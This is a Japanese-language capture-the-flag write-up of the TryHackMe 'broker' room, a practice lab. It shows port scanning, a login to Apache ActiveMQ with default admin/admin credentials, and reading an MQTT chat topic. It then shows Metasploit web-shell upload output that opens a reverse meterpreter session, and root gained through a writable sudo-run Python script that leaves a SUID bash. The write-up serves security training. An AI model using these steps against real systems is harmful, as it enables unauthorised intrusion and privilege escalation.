# broker CTF

https://tryhackme.com/room/broker

## Enumeration

```shell
TARGET=10.65.186.95
sudo bash -c "echo $TARGET   broker.thm >> /etc/hosts"
```

### ポートスキャン

```shell
nmap -vv -p1001-9999 $TARGET

PORT     STATE SERVICE     REASON
1883/tcp open  mqtt        syn-ack ttl 62
8161/tcp open  patrol-snmp syn-ack ttl 62
```

```sh
sudo nmap -sV -p1883,8161 $TARGET

PORT     STATE SERVICE VERSION
1883/tcp open  mqtt?
8161/tcp open  http    Jetty 7.6.9.v20130131
```

HTTPでWeb表示すると、`Welcome to the Apache ActiveMQ!` の表示。

ActiveMQのデフォルト認証 `admin/admin` でログインできた。

```
Welcome to the Apache ActiveMQ Console of broker (ID:activemq-39123-1763941907279-0:1)

Broker
Name	broker
Version	5.9.0
ID	ID:activemq-39123-1763941907279-0:1
Uptime	27 minutes
Store percent used	0
Memory percent used	0
Temp percent used	
```

## ActiveMQ

topicを表示。secret_chat を発見。

```xml
This XML file does not appear to have any style information associated with it. The document tree is shown below.
<topics>
<topic name="secret_chat">
<stats size="0" consumerCount="0" enqueueCount="124" dequeueCount="0"/>
</topic>
<topic name="ActiveMQ.Advisory.Topic">
<stats size="0" consumerCount="0" enqueueCount="1" dequeueCount="0"/>
</topic>
<topic name="ActiveMQ.Advisory.Connection">
<stats size="0" consumerCount="0" enqueueCount="1" dequeueCount="0"/>
</topic>
<topic name="ActiveMQ.Advisory.MasterBroker">
<stats size="0" consumerCount="0" enqueueCount="1" dequeueCount="0"/>
</topic>
</topics>
```

### MQTT

MQTTXをダウンロード、インストール。https://mqttx.app/ja/downloads?os=linux

GUIで接続。MQTTバージョンは3.1にする。  
New Subscription で `secret_chat/#` を指定。

```
Topic: secret_chatQoS: 0

Max: Nice! Gotta go now, the boss will kill us if he sees us chatting here at work. This broker is not meant to be used like that lol. See ya!
2025-11-23 19:44:18:857

Topic: secret_chatQoS: 0

Paul: Hey, have you played the videogame 'Hacknet' yet?
2025-11-23 19:44:38:867

Topic: secret_chatQoS: 0

Max: Yeah, honestly that's the one game that got me into hacking, since I wanted to know how hacking is 'for real', you know? ;)
2025-11-23 19:44:48:888

Topic: secret_chatQoS: 0

Paul: Sounds awesome, I will totally try it out then ^^
2025-11-23 19:44:58:889

Topic: secret_chatQoS: 0

Max: Nice! Gotta go now, the boss will kill us if he sees us chatting here at work. This broker is not meant to be used like that lol. See ya!
2025-11-23 19:45:08:900
```

## 脆弱性

metasploit モジュールがある。

```sh
$ searchsploit ActiveMQ 5.9.0
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
ActiveMQ < 5.14.0 - Web Shell Upload (Metasploit)                                 | java/remote/42283.rb
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

meterpreter 取得成功。

```sh
msf exploit(multi/http/apache_activemq_upload_jsp) > run
[*] Started reverse TCP handler on 192.168.130.30:4444 
[*] Uploading http://10.65.186.95:8161//opt/apache-activemq-5.9.0/webapps/api//pXUslfeIy.jar
[*] Uploading http://10.65.186.95:8161//opt/apache-activemq-5.9.0/webapps/api//pXUslfeIy.jsp
[*] Sending stage (58073 bytes) to 10.65.186.95
[+] Deleted /opt/apache-activemq-5.9.0/webapps/api//pXUslfeIy.jar
[+] Deleted /opt/apache-activemq-5.9.0/webapps/api//pXUslfeIy.jsp
[*] Meterpreter session 1 opened (192.168.130.30:4444 -> 10.65.186.95:58318) at 2025-11-23 20:06:40 -0500

meterpreter > 
```

カレントディレクトリにフラグがあった。

```sh
pwd
/opt/apache-activemq-5.9.0
ls -al
total 9984
drwxr-sr-x 1 activemq activemq     4096 Dec 26  2020 .
drwxr-xr-x 1 root     root         4096 Dec 25  2020 ..
-rw-r--r-- 1 activemq activemq    40580 Oct 14  2013 LICENSE
-rw-r--r-- 1 activemq activemq     3334 Oct 14  2013 NOTICE
-rw-r--r-- 1 activemq activemq     2610 Oct 14  2013 README.txt
-rwxr-xr-x 1 activemq activemq 10105484 Oct 14  2013 activemq-all-5.9.0.jar
drwxr-xr-x 1 activemq activemq     4096 Dec 25  2020 bin
-rw-rw-r-- 1 activemq activemq     1443 Dec 25  2020 chat.py
drwxr-xr-x 1 activemq activemq     4096 Dec 25  2020 conf
drwxr-xr-x 1 activemq activemq     4096 Dec 26  2020 data
-rw-r--r-- 1 activemq activemq       23 Dec 25  2020 flag.txt
drwxr-xr-x 1 activemq activemq     4096 Dec 25  2020 lib
-r-x------ 1 activemq activemq      143 Dec 25  2020 start.sh
-rw-rw-r-- 1 activemq activemq      768 Dec 25  2020 subscribe.py
drwxr-sr-x 5 activemq activemq     4096 Nov 24 01:06 tmp
drwxr-xr-x 1 activemq activemq     4096 Dec 25  2020 webapps
```

## 権限昇格

/opt/apache-activemq-5.9.0/subscribe.py を root として実行できる。

```sh
sudo -l
Matching Defaults entries for activemq on activemq:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User activemq may run the following commands on activemq:
    (root) NOPASSWD: /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
```

書き込み権限がある。

```sh
ls -al /opt/apache-activemq-5.9.0/subscribe.py
-rw-rw-r-- 1 activemq activemq 768 Dec 25  2020 /opt/apache-activemq-5.9.0/subscribe.py
```

変更、実行、成功。

```sh
sudo /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py

ls -al
total 11128
drwxr-sr-x 1 activemq activemq     4096 Nov 24 01:15 .
drwxr-xr-x 1 root     root         4096 Dec 25  2020 ..
-rw-r--r-- 1 activemq activemq    40580 Oct 14  2013 LICENSE
-rw-r--r-- 1 activemq activemq     3334 Oct 14  2013 NOTICE
-rw-r--r-- 1 activemq activemq     2610 Oct 14  2013 README.txt
-rwxr-xr-x 1 activemq activemq 10105484 Oct 14  2013 activemq-all-5.9.0.jar
-rwsr-xr-x 1 root     root      1168776 Nov 24 01:15 bash
drwxr-xr-x 1 activemq activemq     4096 Dec 25  2020 bin
-rw-rw-r-- 1 activemq activemq     1443 Dec 25  2020 chat.py
drwxr-xr-x 1 activemq activemq     4096 Dec 25  2020 conf
drwxr-xr-x 1 activemq activemq     4096 Dec 26  2020 data
-rw-r--r-- 1 activemq activemq       23 Dec 25  2020 flag.txt
drwxr-xr-x 1 activemq activemq     4096 Dec 25  2020 lib
-r-x------ 1 activemq activemq      143 Dec 25  2020 start.sh
-rw-rw-r-- 1 activemq activemq      217 Nov 24 01:15 subscribe.py
drwxr-sr-x 5 activemq activemq     4096 Nov 24 01:06 tmp
drwxr-xr-x 1 activemq activemq     4096 Dec 25  2020 webapps
```

昇格成功

```sh
./bash -p
id
uid=1000(activemq) gid=1000(activemq) euid=0(root) groups=1000(activemq)
```

## 振り返り

- ActiveMQ は初見。
- MQTTX も初めて知ったので良い学びだった。

## Tags

#tags:ActiveMQ #tags:mqtt
